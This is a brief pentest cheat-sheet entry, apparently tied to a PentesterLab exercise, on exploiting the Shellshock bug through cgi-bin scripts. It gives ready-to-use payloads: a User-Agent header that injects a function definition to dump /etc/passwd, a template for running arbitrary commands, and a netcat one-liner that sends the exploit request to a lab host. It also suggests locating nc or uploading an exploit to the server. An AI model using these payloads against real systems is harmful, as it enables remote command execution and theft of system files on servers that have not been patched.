## When you have a call to cgi-bin

- Modify a header in burp, for example user-agent:
`User-Agent: () { :;}; echo $(</etc/passwd)`
`User-Agent: () { :;}; <command_here>` (your command may not be echoed back, or you can have a 500 internal error but it worked).

- Or directly : `echo -e "HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo \$(</etc/passwd)\r\nHost: ptl-f9988b7c-3e5ecaaf.libcurl.so\r\nConnection: close\r\n\r\n" | nc ptl-f9988b7c-3e5ecaaf.libcurl.so 80`

- Try to find the path of nc, or upload your exploit on the webserver. 